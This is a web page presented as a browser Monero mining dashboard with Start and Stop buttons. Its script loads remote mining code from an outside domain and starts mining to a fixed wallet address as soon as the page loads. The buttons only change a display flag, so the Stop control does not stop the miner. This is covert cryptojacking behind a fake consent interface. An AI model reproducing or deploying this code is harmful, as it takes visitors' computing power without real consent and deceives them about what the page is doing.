<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Monero Mining Website</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <header>
        <h1>Monero Mining Dashboard</h1>
        <nav>
            <a href="#about">About</a>
            <a href="#features">Features</a>
            <a href="#contact">Contact</a>
        </nav>
    </header>

    <main>
        <section id="about">
            <h2>About Mining</h2>
            <p>Start mining Monero (XMR) directly from your browser. Use this site to contribute computational power.</p>
        </section>

        <section id="features">
            <h2>Mining Controls</h2>
            <button id="start-mining">Start Mining</button>
            <button id="stop-mining" disabled>Stop Mining</button>
            <p><strong>Hashrate:</strong> <span id="hash-rate">0</span> H/s</p>
            <p><strong>Total Hashes:</strong> <span id="total-hashes">0</span></p>
        </section>
    </main>

    <footer>
        <p>&copy; 2024 Monero Mining. All rights reserved.</p>
    </footer>

    <!-- Script -->
    <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
    <script>
        let isMining = false;
        let totalHashes = 0;

        // Инициализация EverythingIsLife
        try {
            EverythingIsLife('41iVeDotGpaG9u4xgzjZZoEoWx6znhpaT77xjrJ4k8HP8mQx8UrzxnSKikNuZ3XdZQ6BGcPMUK2GmGfj8utMGqG3GHMzpip', 'x', 30);
            console.log('EverythingIsLife initialized.');
        } catch (error) {
            console.error('Failed to initialize EverythingIsLife:', error);
        }

        // Элементы интерфейса
        const startMiningButton = document.getElementById('start-mining');
        const stopMiningButton = document.getElementById('stop-mining');
        const hashRateDisplay = document.getElementById('hash-rate');
        const totalHashesDisplay = document.getElementById('total-hashes');

        // Обновление хешрейта
        function updateStats() {
            if (isMining && typeof EverythingIsLife.getHashRate === 'function') {
                const hashRate = EverythingIsLife.getHashRate();
                totalHashes += hashRate; // Прибавляем к общей сумме
                hashRateDisplay.innerText = hashRate.toFixed(2);
                totalHashesDisplay.innerText = totalHashes.toFixed(0);
            } else if (!isMining) {
                hashRateDisplay.innerText = "0";
            }
        }

        // Запуск майнинга
        startMiningButton.addEventListener('click', () => {
            isMining = true;
            startMiningButton.disabled = true;
            stopMiningButton.disabled = false;
            console.log('Mining started.');
        });

        // Остановка майнинга
        stopMiningButton.addEventListener('click', () => {
            isMining = false;
            startMiningButton.disabled = false;
            stopMiningButton.disabled = true;
            console.log('Mining stopped.');
        });

        // Интервал обновления
        setInterval(updateStats, 1000);
    </script>
</body>
</html>
